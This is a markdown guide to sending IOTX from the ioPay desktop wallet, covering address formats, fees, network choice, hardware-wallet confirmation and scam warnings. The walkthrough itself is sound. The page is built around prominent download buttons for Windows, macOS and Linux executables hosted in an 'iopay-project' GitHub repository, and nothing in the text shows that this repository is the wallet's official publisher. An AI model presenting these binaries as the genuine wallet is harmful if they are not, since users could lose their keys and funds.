![ioPay Wallet: desktop wallet guide](assets/banner-article.png)

# How to Send IOTX From ioPay Wallet

Sending IOTX from ioPay Wallet is four fields and one confirmation: **recipient address, amount, fee, confirm.** The reason it goes wrong for people is almost never the form - it is the address format, or not knowing which chain the recipient expects.

<p align="center"><a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0969da?style=for-the-badge&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0969da?style=for-the-badge&labelColor=0B1733&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0969da?style=for-the-badge&labelColor=0B1733&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| ![Windows](https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white) | Windows 10 (1909) or later, 64-bit | [iopay-wallet-desktop-win-v2.0.2.exe](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white) | macOS 12 or later | [iopay-wallet-desktop-macos-v2.0.2.dmg](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white) | x64, Ubuntu 20.04 or later, or equivalent | [iopay-wallet-desktop-linux-v2.0.2.zip](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip) |

</div>

All three files and their sizes are on the [ioPay Wallet v2.0.2 release page](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2); their SHA-256 values are published in the [app README](https://github.com/iopay-project/iopay-desktop-wallet).

> **Only download from this GitHub release page.** A build offered anywhere else is not this release, whatever name it carries.

## Before you send

- **The app is unlocked** and showing the account that holds the IOTX.
- **You have IOTX for the fee** on top of the amount. Sending your entire balance and leaving nothing for gas fails every time.
- **You know which address format the recipient expects.** Every IoTeX account has two forms - `io1...` and `0x...` - and both belong to the same account (F019, F031). Which one you paste depends on where it is going, not on which one looks familiar.
- **The recipient gave you the address themselves**, not from a screenshot, a group chat or a "support" message.

## The steps

1. **Open send** in the wallet and choose the account to send from.
2. **Paste or scan the recipient's address.** The wallet offers a paste field and a QR scanner; if you scan, check the first and last characters against the source anyway.
3. **Enter the amount.** Read the fee estimate next to it before you confirm - the fee is charged on top, and it varies with network conditions ([what the fee is](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/iopay-wallet-fees-explained.md)).
4. **Check the network.** A native IOTX transfer goes to an IoTeX address; a transfer to an exchange may belong to a chain the venue names in its own form. If the venue says "Ethereum (ERC-20)", the asset on the other side is a different token, not native IOTX.
5. **Review, then confirm.** If you use a Ledger or Trezor, the device shows the address and amount - read them there, on the device, not on the screen (F028).
6. **Read the result.** The wallet reports transaction status, the fee paid and the block number once included (F020). That is the confirmation; a balance that lags is not.

## Which address do I paste?

- **To another IoTeX wallet or a native IoTeX withdrawal:** either form of the same account works, because both are the same key. Give or take the `io1...` form by default with services that ask for "IoTeX", and the `0x...` form where the venue expects an EVM address.
- **To an exchange deposit address:** use exactly the address the venue gave you, on exactly the network it named. Do not "convert" it to another format.
- **To a different chain:** not this transaction. Use a bridge, not a send.

The full explanation of why two forms exist is [here](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/io1-and-0x-addresses-in-iopay.md); the short version is that IoTeX is EVM-compatible and exposes both encodings of one key.

## After you send

**It says sent but the recipient does not see it.** Check the transaction's block number first, then ask the recipient which address and which chain they are watching. A transfer to the right address on a chain the recipient is not looking at looks missing and is not - [the receiving side](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/receiving-iotx-in-iopay-wallet.md) covers that half.

**It is pending and not confirming.** That is [a different problem](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/iopay-wallet-transaction-stuck-pending.md) - the transaction reached the network, and the fix is time or a replacement, not a resend.

**The address was wrong.** If the transaction is mined, it is final. There is no recall and no support channel that can reverse it. If it went to an address you control in another format or another account, you can move it back; if it went to an address nobody controls, it is gone.

## The two mistakes that cost the most

**Pasting an address from a chat or a "support agent".** No legitimate support process sends you an address to send funds to. If someone asked you to send IOTX to "verify" or "unlock" a wallet, it is theft.

**Sending everything.** Leave gas. A wallet with zero IOTX cannot send the transaction that would rescue it.

## FAQ

**How do I send IOTX from ioPay Wallet?**
Paste the recipient's address, enter the amount, read the fee, confirm - and confirm on the hardware device if you use one.

**What is the fee?**
It varies with network conditions and is shown before you confirm. This page does not quote a figure, because a fixed number would be wrong within days.

**Can I cancel a send?**
Once it is mined, no. While it is pending, only by a same-nonce replacement if the interface supports it.

**Can I send to a `0x...` address?**
Yes - it is the same account in its EVM form, provided the recipient is expecting a transfer on IoTeX. Cross-chain sends are a bridge job, not a send job.

**Do I need a memo or destination tag?**
Native IoTeX transfers do not use one. If a venue's form shows a field for it, follow the venue's instruction.

## Read the review screen like a checklist

The confirmation screen is the last place a mistake is cheap, and it shows four things worth reading separately rather than as one block.

**The destination**, character by character - first four and last four are enough when you are comparing against a source you trust, and the middle is where copy errors hide.

**The amount**, and whether it leaves you any gas. A send that consumes the whole balance leaves you a wallet you cannot use until someone sends you IOTX.

**The fee**, which is quoted for this transaction and not for the last one you made.

**The network**, where the interface names one. Native IOTX to an IoTeX address is the default path; anything else is a different asset or a bridge.

If any of the four is unclear, stop before confirming - there is no screen afterwards where it can be corrected.


---

*Address formats and chain identity (IoTeX mainnet, chain ID 4689) follow IoTeX documentation. The steps describe the send flow of the v2.0.2 build.*
